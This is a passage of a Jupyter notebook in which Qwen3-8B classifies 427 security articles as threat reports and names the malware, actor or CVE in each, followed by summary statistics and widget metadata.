            "Is threat: True\tMain object: Tool: Scan4You\n",
            "Processing 368/427: latest intelligence march 2018...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Inception Framework\n",
            "Processing 369/427: coin mining without browser...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Coinhive\n",
            "Processing 370/427: istr 23 cyber security threat landscape...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "  Processed 370/427 articles\n",
            "Processing 371/427: fakebank intercepts calls banks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Android.Fakebank\n",
            "Processing 372/427: inception framework hiding behind proxies...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Inception Framework\n",
            "Processing 373/427: microsoft patch tuesday march 2018...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2018-0872\n",
            "Processing 374/427: latest intelligence february 2018...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Chafer\n",
            "Processing 375/427: chafer latest attacks reveal heightened ambitions...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Chafer\n",
            "Processing 376/427: android malware harvests facebook details...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Android.Fakeapp\n",
            "Processing 377/427: microsoft patch tuesday february 2018...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 378/427: meltdown spectre cpu bugs...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2017-5754\n",
            "Processing 379/427: android malware uber credentials deep links...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Android.Fakeapp\n",
            "Processing 380/427: browser mining cryptocurrency...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "  Processed 380/427 articles\n",
            "Processing 381/427: triton malware ics...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Triton\n",
            "Processing 382/427: microsoft patch tuesday december...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2017-11888\n",
            "Processing 383/427: mailsploit email exploit spoofing...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: Mailsploit\n",
            "Processing 384/427: surge adwind distribution emails...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Adwind\n",
            "Processing 385/427: latest intel november 2017...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Android.Doublehidden\n",
            "Processing 386/427: doublehidden android malware google play...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Android.Doublehidden\n",
            "Processing 387/427: android malware porn apps chinese...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Android.Rootnik.B\n",
            "Processing 388/427: ms patch tuesday november 2017...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 389/427: tech support scams aes...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Technique: Living off the land\n",
            "Processing 390/427: sowbug cyber espionage south america asia...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Sowbug\n",
            "  Processed 390/427 articles\n",
            "Processing 391/427: ransomeware risks 2017...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2017-0144\n",
            "Processing 392/427: petya ransomware wiper...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Petya\n",
            "Processing 393/427: wannacry ransomware attack...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: WannaCry\n",
            "Processing 394/427: dragonfly energy sector cyber attacks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Dragonfly\n",
            "Processing 395/427: bachosens cyber crime investigation...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Bachosens\n",
            "Processing 396/427: longhorn cyberespionage vault7...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Longhorn\n",
            "Processing 397/427: bayrob suspects extradited...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Bayrob\n",
            "Processing 398/427: shamoon back destructive...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Shamoon\n",
            "Processing 399/427: gatak healthcare...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Gatak\n",
            "Processing 400/427: odinaff trojan financial attacks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Trojan.Odinaff\n",
            "  Processed 400/427 articles\n",
            "Processing 401/427: buckeye cyberespionage hong kong...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Buckeye\n",
            "Processing 402/427: equation cyberespionage group breached...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: Equation\n",
            "Processing 403/427: strider cyberespionage sauron...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Remsec\n",
            "Processing 404/427: swift malware financial attacks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Backdoor.Fimlis\n",
            "Processing 405/427: tick cyberespionage japan...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Daserf\n",
            "Processing 406/427: taiwan cyberespionage backdoor trojan...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Backdoor.Dripion\n",
            "Processing 407/427: operation blockbuster lazarus...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Lazarus Group\n",
            "Processing 408/427: dridex financial trojan spam...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Dridex\n",
            "Processing 409/427: dyre bank fraud group takedown...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Dyre\n",
            "Processing 410/427: destructive disakil malware ukraine...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Disakil\n",
            "  Processed 410/427 articles\n",
            "Processing 411/427: dridex takedown...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Dridex\n",
            "Processing 412/427: regin mysteries cyberespionage...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Regin\n",
            "Processing 413/427: black vine cyberespionage aerospace healthcare...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Black Vine\n",
            "Processing 414/427: forkmeiamfamous seaduke duke...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Seaduke\n",
            "Processing 415/427: butterfly corporate attacks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Butterfly\n",
            "Processing 416/427: dyre financial trojan...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Dyre\n",
            "Processing 417/427: duqu 20 cyberespionage...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Duqu 2.0\n",
            "Processing 418/427: equation cyberespionage group...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Grayphish\n",
            "Processing 419/427: carbanak cybercrime gang...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Trojan.Carberp.B\n",
            "Processing 420/427: destover destructive malware south korea...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Backdoor.Destover\n",
            "  Processed 420/427 articles\n",
            "Processing 421/427: regin espionage surveillance...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Regin\n",
            "Processing 422/427: turla espionage diplomats...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Turla\n",
            "Processing 423/427: dragonfly energy companies sabotage...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Dragonfly\n",
            "Processing 424/427: hidden lynx professional hackers hire...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Hidden Lynx\n",
            "Processing 425/427: darkseoul cyberattacks south korea...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: DarkSeoul gang\n",
            "Processing 426/427: duqu next stuxnet...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Duqu\n",
            "Processing 427/427: stuxnet dossier espionage...\n",
            "Is threat: True\tMain object: Malware: Stuxnet\n",
            "💾 Saving to: /content/drive/MyDrive/LLM_TKIG/data/topic-classification/topic_classification_Qwen3-8B_2025-08-27_14-39-47.json\n",
            "✅ Successfully saved results to /content/drive/MyDrive/LLM_TKIG/data/topic-classification/topic_classification_Qwen3-8B_2025-08-27_14-39-47.json\n",
            "\n",
            "📊 CLASSIFICATION STATISTICS:\n",
            "Total articles: 427\n",
            "Threat reports: 390\n",
            "Non-threat reports: 37\n",
            "Threat report percentage: 91.3%\n",
            "\n",
            "🔍 SAMPLE THREAT REPORTS:\n",
            "  1. FortiGuard Labs Threat Research...\n",
            "     Main object: Malware: RondoDox\n",
            "  2. NailaoLocker Ransomware’s “Cheese”...\n",
            "     Main object: Malware: NailaoLocker\n",
            "  3. Old Miner, New Tricks...\n",
            "     Main object: Malware: H2Miner\n",
            "  4. How FortiSandbox 5.0 Detects Dark 101 Ransomware Despite Eva...\n",
            "     Main object: Malware: Dark 101\n",
            "  5. Catching Smarter Mice with Even Smarter Cats...\n",
            "     Main object: Tool: IDA Pro\n"
          ]
        }
      ],
      "execution_count": null,
      "source": [
        "import datetime\n",
        "\n",
        "results = process_data(data, model)\n",
        "today = datetime.datetime.now().strftime(\"%Y-%m-%d_%H-%M-%S\")\n",
        "\n",
        "output_path = f\"{BASE_PATH}/data/topic-classification/topic_classification_Qwen3-8B_{today}.json\"\n",
        "save_results(results, output_path)"
      ],
      "id": "cbcc52a4b25e93a6"
    }
  ],
  "metadata": {
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.10.15"
    },
    "colab": {
      "provenance": [],
      "gpuType": "L4"
    },
    "accelerator": "GPU",
    "widgets": {
      "application/vnd.jupyter.widget-state+json": {
        "3ef531275f204cc5a1479462f421a013": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_ae816817df76449fa44db3e159418167",
              "IPY_MODEL_96741bf88ef7446cba4a6d1e9b28b210",
              "IPY_MODEL_5e4984b09d7a461a933811fa112a8b86"
            ],
            "layout": "IPY_MODEL_f74e9a52623947399a4d40e4c2c3b78f"
          }
        },
        "ae816817df76449fa44db3e159418167": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_aa6adb5bd3c74f6ab2fb0089f1eb3fb9",
            "placeholder": "​",
            "style": "IPY_MODEL_b83ecbae79ae4fa2a537c9cdcd0b682e",
            "value": "tokenizer_config.json: "
          }
        },
        "96741bf88ef7446cba4a6d1e9b28b210": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_cdaa9db2b71d47e9a1aeefaed548cdbc",
            "max": 1,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_f71be5ea0d3d4a509e94368e0e9e32b7",
            "value": 1
          }
        },
        "5e4984b09d7a461a933811fa112a8b86": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_7739c23345b645969f1b78f781ccce62",
            "placeholder": "​",
            "style": "IPY_MODEL_202c677f7541424f82511a75fabe8f7d",
            "value": " 10.5k/? [00:00&lt;00:00, 1.11MB/s]"
          }
        },
        "f74e9a52623947399a4d40e4c2c3b78f": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "aa6adb5bd3c74f6ab2fb0089f1eb3fb9": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
